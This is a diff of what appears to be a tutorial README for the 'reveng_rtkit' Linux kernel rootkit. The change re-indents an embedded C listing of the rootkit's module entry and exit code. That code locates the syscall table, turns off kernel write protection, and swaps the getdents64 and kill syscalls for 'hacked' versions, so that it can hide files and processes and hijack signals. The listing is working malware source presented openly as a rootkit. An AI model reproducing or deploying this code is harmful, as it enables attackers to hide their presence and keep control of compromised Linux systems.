@@ -1474,93 +1474,93 @@ static int is_invisible(pid_t pid)
                    
    1. This is the whole rootkit.c file.
 ```c
-                   // Test_rtkit.c
+  // Test_rtkit.c
 
-                   #include <linux/init.h>		/* Needed for the macros */
-                   #include <linux/module.h>	/* Needed by all modules */
-                   #include <linux/kernel.h>	/* Needed for printing log level messages */
-                   #include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
-                   #include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
+#include <linux/init.h>		/* Needed for the macros */
+#include <linux/module.h>	/* Needed by all modules */
+#include <linux/kernel.h>	/* Needed for printing log level messages */
+#include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
+#include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
                             * To set those modified values we have to invoke commit_creds(). 
                             * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
-                   #include "Test_hook_getdents64.h"
+#include "Test_hook_getdents64.h"
 
 
-                    /* Function Prototypes */
+/* Function Prototypes */
 
-                    static int      __init rootkit_init(void);
-                    static void     __exit rootkit_exit(void);
-
-
-                    // =================== Entry Function ====================
-
-                    static int __init rootkit_init(void)
-                    {
-                      printk(KERN_INFO "=================================================\n");
-                      printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
-                      printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");
-
-                      __sys_call_table = get_syscall_table();
-                      if (!__sys_call_table)
-                        return -1;
-
-                      printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
+static int      __init rootkit_init(void);
+static void     __exit rootkit_exit(void);
 
 
-                      /* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
-                      *
-                      * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
-                      *
-                      * unsigned long (*read_cr0)(void);
-                      */
-                      cr0 = read_cr0();
+// =================== Entry Function ====================
 
-                      // Storing original syscall
-                      orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
-                      orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
+static int __init rootkit_init(void)
+{
+	printk(KERN_INFO "=================================================\n");
+	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
+	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");
 
-                      //printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+	__sys_call_table = get_syscall_table();
+	if (!__sys_call_table)
+		return -1;
+	
+	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);
 
-                      unprotect_memory();
 
-                      // Editing syscall table targeting "getdents64" and "kill" syscall with our created "hacked_getdents64" and "hacked_kill".
-                      __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-                      __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
+	 *
+	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
+	 *
+	 * unsigned long (*read_cr0)(void);
+	 */
+	cr0 = read_cr0();
 
-                      //printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
+	// Storing original syscall
+	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
+	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
 
-                      protect_memory();
+	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
 
-                      return 0;
+	unprotect_memory();
 
-                    }
+	// Editing syscall table targeting "getdents64" and "kill" syscall with our created "hacked_getdents64" and "hacked_kill".
+	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
-                    // ========================== Exit Function ====================
+	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);
 
-                    static void __exit rootkit_exit(void)
-                    {
-                      printk(KERN_INFO "\n=========================================\n");
+	protect_memory();
 
-                      unprotect_memory();
-                      printk(KERN_INFO "\t\t\t\t\t\t back to normal");
+	return 0;
 
-                      // Editing the sycall table back to normal, i.e. with original syscalls: "getdents64" and "kill" syscalls.
-                      __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-                      __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+}
 
-                      protect_memory();
+// ========================== Exit Function ====================
 
-                      printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
-                      printk(KERN_INFO "=================================================\n");
-                    }
+static void __exit rootkit_exit(void)
+{
+	printk(KERN_INFO "\n=========================================\n");
 
-                    module_init(rootkit_init);
-                    module_exit(rootkit_exit);
+	unprotect_memory();
+	printk(KERN_INFO "\t\t\t\t\t\t back to normal");
 
-                    MODULE_LICENSE("GPL");
-                    MODULE_AUTHOR("reveng007");
-                    MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
-                    MODULE_VERSION("1.0");
+	// Editing the sycall table back to normal, i.e. with original syscalls: "getdents64" and "kill" syscalls.
+	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+
+	protect_memory();
+
+	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
+	printk(KERN_INFO "=================================================\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("reveng007");
+MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
+MODULE_VERSION("1.0");
 ```
    This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447). 
 
